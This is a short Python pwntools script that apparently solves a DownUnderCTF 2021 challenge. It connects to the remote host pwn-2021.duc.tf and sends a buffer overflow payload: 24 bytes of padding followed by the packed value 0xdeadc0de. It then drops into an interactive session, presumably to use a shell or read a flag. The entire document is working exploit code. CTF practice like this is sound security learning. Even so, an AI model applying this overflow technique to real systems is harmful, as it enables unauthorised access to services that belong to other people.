from pwn import *

io = remote("pwn-2021.duc.tf", 31916)
io.recv()

payload = b"A" * 24
payload += p64(0xdeadc0de)

io.sendline(payload)
io.interactive()
